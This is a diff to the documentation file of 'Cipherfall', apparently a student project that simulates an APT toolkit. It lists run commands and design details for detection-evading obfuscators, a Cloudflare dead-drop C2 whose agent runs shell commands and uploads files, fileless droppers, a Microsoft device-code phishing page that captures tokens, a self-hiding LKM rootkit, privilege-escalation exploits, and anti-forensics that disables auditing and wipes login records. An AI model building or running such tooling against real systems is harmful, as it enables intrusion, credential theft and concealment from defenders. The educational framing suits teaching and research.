@@ -9,48 +9,48 @@ Cipherfall is an ESGI annual project simulating the reconstruction of an APT's t
 ## Module execution
 
 ```bash
-# Recon — single semicolon-delimited output line
-bash Modules/Recon/recon.sh
+# Phantom Eye — single semicolon-delimited output line
+bash Modules/Recon/phantom_eye.sh
 
-# Obfuscate a bash script (advanced: ROT13+chunks+random vars+decoys)
-bash Modules/Obfuscator/obfuscator_v2.sh <script.sh>
+# ShadowScript: obfuscate a bash script (advanced: ROT13+chunks+random vars+decoys)
+bash Modules/Obfuscator/shadowscript.sh <script.sh>
 
-# Obfuscate a Python script (same technique as obfuscator_v2 but for .py)
-python3 Modules/Obfuscator/obfuscator_py.py <script.py>
+# ShadowScript: obfuscate a Python script (same technique but for .py)
+python3 Modules/Obfuscator/shadowscript.py <script.py>
 
-# Anti-forensics: ghost shell (root recommended for full coverage)
-sudo bash Modules/Anti-forensics/ghost-shell.sh
+# EchoErase: ghost shell (root recommended for full coverage)
+sudo bash Modules/Anti-forensics/echoerase_ghost.sh
 
-# Anti-forensics: inject randomized sleep delays between lines of a script
-bash Modules/Anti-forensics/delayer.sh <script.sh> <fixed_delay_s> <jitter_s>
+# EchoErase: inject randomized sleep delays between lines of a script
+bash Modules/Anti-forensics/echoerase_delayer.sh <script.sh> <fixed_delay_s> <jitter_s>
 
-# Anti-forensics: rename a file (base64 stem by default, or random/ext options)
-python3 Modules/Anti-forensics/renamer.py [--no-recover] [--ext] [--view] <file>
+# EchoErase: rename a file (base64 stem by default, or random/ext options)
+python3 Modules/Anti-forensics/echoerase_renamer.py [--no-recover] [--ext] [--view] <file>
 
-# C2: start server (requires WORKER_URL env var pointing to Cloudflare Worker)
-cd Modules/C2 && pip install -r requirements.txt
+# NullRelay: start Cloudflare C2 server (requires WORKER_URL env var)
+cd Modules/C2/cloudflare-worker && pip install -r requirements.txt
 WORKER_URL=https://... C2_PSK=... python3 server.py
 
-# C2: interactive TUI dashboard (talks to server admin API)
+# C2: interactive TUI dashboard (NullRelay / ClockVenom)
 cd Modules/C2 && WORKER_URL=https://... C2_PSK=... python3 tui.py
 
-# C2: deploy Cloudflare Worker dead-drop
-cd Modules/C2 && wrangler secret put WORKER_SECRET && wrangler deploy
+# NullRelay: deploy Cloudflare Worker dead-drop
+cd Modules/C2/cloudflare-worker && wrangler secret put WORKER_SECRET && wrangler deploy
 
-# Dropper: fileless binary execution via memfd_create
-python3 Modules/Dropper/net_bin_dropper.py
+# ShadowDrop: fileless binary execution via memfd_create
+python3 Modules/Dropper/shadowdrop_bin.py
 
-# Dropper: fileless bash script execution via memfd_create
-python3 Modules/Dropper/net_sh_dropper.py
+# ShadowDrop: fileless bash script execution via memfd_create
+python3 Modules/Dropper/shadowdrop_sh.py
 
-# Dropper: fileless Python script execution via memfd_create + exec
-python3 Modules/Dropper/net_py_dropper.py
+# ShadowDrop: fileless Python script execution via memfd_create + exec
+python3 Modules/Dropper/shadowdrop_py.py
 
-# Phishing: Microsoft device flow 2FA bypass (serves phishing page)
-cd Modules/Phishing/deviceflowbypass2fa && pip install -r req.txt && python3 server.py
+# PhantomPage: Microsoft device flow 2FA bypass (serves phishing page)
+cd Modules/Phishing/deviceflowbypass2fa && pip install -r req.txt && python3 phantompage.py
 
-# Rootkit: build and load LKM
-cd Modules/Rootkits && make && sudo insmod rootkit.ko
+# IronVeil: build and load LKM rootkit
+cd Modules/Rootkits && make && sudo insmod ironveil.ko
 
 # Privesc: DirtyFrag exploit (CVE)
 cd Modules/Privesc/dirtyfrag && ./exp
@@ -66,11 +66,11 @@ bash Modules/Privesc/fragnesia.sh
 
 Full attack pipeline: recon target → obfuscate payload → drop via fileless dropper → beacon to C2 via Cloudflare dead-drop → escalate privileges → persist with rootkit → cover tracks with anti-forensics.
 
-**Recon** (`recon.sh`): Collects system fingerprint data using only built-in tools and standard binaries (`testparm`, `aws`, `psql`, `mongosh`, `gitlab-rake`, etc.). Falls back gracefully to `N/A` for each unavailable data source. Output is always exactly one line: `Distro;Version;Kernel;SMB_Shares;NFS_Exports;S3_Buckets;MariaDB_DBs;PostgreSQL_DBs;MongoDB_DBs;GitLab_Version`.
+**Phantom Eye** (`phantom_eye.sh`): Collects system fingerprint data using only built-in tools and standard binaries (`testparm`, `aws`, `psql`, `mongosh`, `gitlab-rake`, etc.). Falls back gracefully to `N/A` for each unavailable data source. Output is always exactly one line: `Distro;Version;Kernel;SMB_Shares;NFS_Exports;S3_Buckets;MariaDB_DBs;PostgreSQL_DBs;MongoDB_DBs;GitLab_Version`.
 
-**Obfuscator** (`obfuscator_v2.sh`, `obfuscator_py.py`): Stacks gzip → base64 → ROT13, then splits into variable-size chunks, shuffles chunk definition order (Fisher-Yates), encodes all command names in hex (`$'\x..'`) or chr() sequences, and injects decoy variables from a hardcoded fake-pool. The final stub never contains any readable string like `eval`, `base64`, or `gunzip`.
+**ShadowScript** (`shadowscript.sh`, `shadowscript.py`): Stacks gzip → base64 → ROT13, then splits into variable-size chunks, shuffles chunk definition order (Fisher-Yates), encodes all command names in hex (`$'\x..'`) or chr() sequences, and injects decoy variables from a hardcoded fake-pool. The final stub never contains any readable string like `eval`, `base64`, or `gunzip`.
 
-**C2** (`server.py`, `agent.py`, `worker.js`, `tui.py`, `operator_cli.py`): Three-tier architecture — C2 server (operator-side, no public port) ↔ Cloudflare Worker KV dead-drop ↔ agent (victim-side). Server and agent never connect directly; all traffic is HTTPS/443 to Cloudflare edge.
+**NullRelay / ClockVenom** (`server.py`, `nullrelay.py` / `clockvenom.py`, `worker.js`, `tui.py`, `operator_cli.py`): Three-tier architecture — C2 server (operator-side, no public port) ↔ Cloudflare Worker KV dead-drop ↔ agent (victim-side). Server and agent never connect directly; all traffic is HTTPS/443 to Cloudflare edge.
 
 _Dead-drop flow:_ (1) operator queues task → stored in SQLite as `pending`; (2) server dispatch loop PUTs encrypted task to Worker `PUT /task/{agent_id}` → marked `sent` on HTTP 200; (3) agent beacons: PUTs heartbeat to `/hb/{agent_id}`, GETs `/task/{agent_id}` (204 = nothing, 200 = execute), PUTs result to `/result/{task_id}`; (4) server collect loop GETs `/result/{task_id}` → decrypts, stores in SQLite, marks `done`.
 
@@ -78,7 +78,7 @@ _Encryption:_ AES-256-GCM. Key = PBKDF2-SHA256(PSK, `cipherfall_c2_v1`, 32 bytes
 
 _Authentication:_ `Authorization: Bearer <token>` where token = `HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]`, derived identically on server and agent. Worker returns 404 on bad token to avoid fingerprinting.
 
-_Agent identity:_ SHA-256 of `/etc/machine-id` (fallback: hostname), truncated to 32 hex chars. Deterministic across reboots. Print with `python3 agent.py --id`. Agent spoofs `User-Agent: Mozilla/5.0 … Chrome/124`.
+_Agent identity:_ SHA-256 of `/etc/machine-id` (fallback: hostname), truncated to 32 hex chars. Deterministic across reboots. Print with `python3 nullrelay.py --id` (or `clockvenom.py --id` for NTP agent). Agent spoofs `User-Agent: Mozilla/5.0 … Chrome/124`.
 
 _Agent commands:_ any shell string (executed via `/bin/sh`, stdout+stderr returned); `UPLOAD:/path` (file read binary, returned as base64).
 
@@ -90,7 +90,7 @@ _Agent env vars (bake before obfuscating):_ `WORKER_URL` (required), `C2_PSK` (`
 
 _Server admin API (127.0.0.1 only):_ `GET /admin/agents`, `GET /admin/tasks`, `POST /admin/register {agent_id, label?}`, `POST /admin/task {agent_id, command}`, `GET /admin/result/<task_id>`.
 
-_TUI_ (`tui.py`, Textual + Rich): two tabs — **Agents** (list agents, browse tasks, dispatch commands, auto-refresh every 5s) and **Payload** (bakes `agent.py` via regex substitution of constants, optionally calls `obfuscator_py.py`). Reads `C2_ADMIN_PORT` (default `1337`), `WORKER_URL`, `C2_PSK`.
+_TUI_ (`tui.py`, Textual + Rich): two tabs — **Agents** (list agents, browse tasks, dispatch commands, auto-refresh every 5s) and **Payload** (bakes `nullrelay.py` or `clockvenom.py` via regex substitution of constants, optionally calls `shadowscript.py`). Reads `C2_ADMIN_PORT` (default `1337`), `WORKER_URL`, `C2_PSK`.
 
 _Operator CLI_ (`operator_cli.py`, stdlib only): `agents`, `register <id> [label]`, `tasks`, `task <id_prefix> <cmd>` (prefix min 4 chars), `result <task_id>`, `wait <task_id>` (polls every 5s).
 
@@ -98,19 +98,19 @@ _Worker deployment:_ `wrangler kv:namespace create "C2_KV"` → paste id in `wra
 
 _Limitations:_ task lost if agent crashes after GET before PUT result (re-queue manually); one pending task per agent at a time; SQLite not suitable for large deployments; agent has no persistence (pair with dropper).
 
-**Dropper** (`net_bin_dropper.py`, `net_sh_dropper.py`, `net_py_dropper.py`): Fileless execution via `memfd_create(2)` — payload downloaded over HTTP(S) never touches disk. Binary dropper: `MFD_CLOEXEC` set, kernel execs the fd directly. Shell dropper: no `MFD_CLOEXEC` (fd must stay open for bash), exec via `/proc/self/fd/<n>`. Python dropper: similar to shell but invokes `python3`. All three support `DAEMON_MODE` for double-fork daemonization.
+**ShadowDrop** (`shadowdrop_bin.py`, `shadowdrop_sh.py`, `shadowdrop_py.py`): Fileless execution via `memfd_create(2)` — payload downloaded over HTTP(S) never touches disk. Binary dropper: `MFD_CLOEXEC` set, kernel execs the fd directly. Shell dropper: no `MFD_CLOEXEC` (fd must stay open for bash), exec via `/proc/self/fd/<n>`. Python dropper: similar to shell but invokes `python3`. All three support `DAEMON_MODE` for double-fork daemonization.
 
 **Phishing** (`deviceflowbypass2fa/`): Microsoft OAuth 2.0 device authorization flow abuse. Flask server proxies requests to `login.microsoftonline.com/common/oauth2/v2.0/devicecode`, displays the user code via `outlook.html` phishing page, then polls for token completion to capture access + refresh tokens. Scope includes `offline_access` to obtain long-lived refresh tokens.
 
-**Rootkit** (`rootkit.c`): Linux LKM rootkit. Hooks `__NR_getdents64`, `__NR_getdents`, `__NR_kill` via syscall table patching (CR0.WP bypass with inline asm). Hides files prefixed `rootkit_`, runtime-controlled files/PIDs via `/proc/rootkit_ctrl` write-only interface. Self-hides from `lsmod` and `/sys/module/` at init. Supports kernels ≥ 4.17 (pt_regs ABI) and ≥ 5.7 (`kallsyms_lookup_name` via kprobe). No persistence across reboot; `rmmod` unavailable after self-hide by design.
+**IronVeil** (`ironveil.c`): Linux LKM rootkit. Hooks `__NR_getdents64`, `__NR_getdents`, `__NR_kill` via syscall table patching (CR0.WP bypass with inline asm). Hides files prefixed `rootkit_`, runtime-controlled files/PIDs via `/proc/rootkit_ctrl` write-only interface. Self-hides from `lsmod` and `/sys/module/` at init. Supports kernels ≥ 4.17 (pt_regs ABI) and ≥ 5.7 (`kallsyms_lookup_name` via kprobe). No persistence across reboot; `rmmod` unavailable after self-hide by design.
 
 **Privesc** (`dirtyfrag/`, `ssh-keysign-pwn/`, `fragnesia.sh`): Three exploits. `dirtyfrag` targets CVE via fragmented memory. `ssh-keysign-pwn` abuses `ssh-keysign` SUID binary. `fragnesia.sh` is a user+network namespace wrapper for CVE-2026-46300 that sets up the unprivileged namespace environment before running the compiled exploit.
 
-**Anti-forensics — ghost-shell** (`ghost-shell.sh`): Five phases: (1) disable kernel auditing (`auditctl -e 0`) + stop auditbeat; (2) erase utmp/wtmp entries for current TTY via `utmpdump -r`; (3) zero lastlog for current UID via `dd` (seek to `uid * 292`); (4) scrub environment variables (SSH_*, SUDO_*, terminal fingerprints); (5) exec shell spoofed as `[kworker/u:0]` via `exec -a`. `trap EXIT` restores audit rules. Limitation: `/proc/<PID>/exe` still points to real bash.
+**EchoErase — ghost-shell** (`echoerase_ghost.sh`): Five phases: (1) disable kernel auditing (`auditctl -e 0`) + stop auditbeat; (2) erase utmp/wtmp entries for current TTY via `utmpdump -r`; (3) zero lastlog for current UID via `dd` (seek to `uid * 292`); (4) scrub environment variables (SSH_*, SUDO_*, terminal fingerprints); (5) exec shell spoofed as `[kworker/u:0]` via `exec -a`. `trap EXIT` restores audit rules. Limitation: `/proc/<PID>/exe` still points to real bash.
 
-**Anti-forensics — delayer** (`delayer.sh`): Injects `sleep <N>` after each substantive line, skipping comments, blank lines, backslash/pipe continuations, and shell control keywords. Delay randomized via awk with nanosecond seed.
+**EchoErase — delayer** (`echoerase_delayer.sh`): Injects `sleep <N>` after each substantive line, skipping comments, blank lines, backslash/pipe continuations, and shell control keywords. Delay randomized via awk with nanosecond seed.
 
-**Anti-forensics — renamer** (`renamer.py`): Renames files using base64 URL-safe stem encoding (RFC 4648 §5, no padding, reversible via `--view`). `--no-recover`: random 6-char alphanumeric stem (CSPRNG, irreversible). `--ext`: replaces extension with a plausible alternative from a family table. All modes combinable except `--view` + `--ext`.
+**EchoErase — renamer** (`echoerase_renamer.py`): Renames files using base64 URL-safe stem encoding (RFC 4648 §5, no padding, reversible via `--view`). `--no-recover`: random 6-char alphanumeric stem (CSPRNG, irreversible). `--ext`: replaces extension with a plausible alternative from a family table. All modes combinable except `--view` + `--ext`.
 
 ## Coding conventions
 
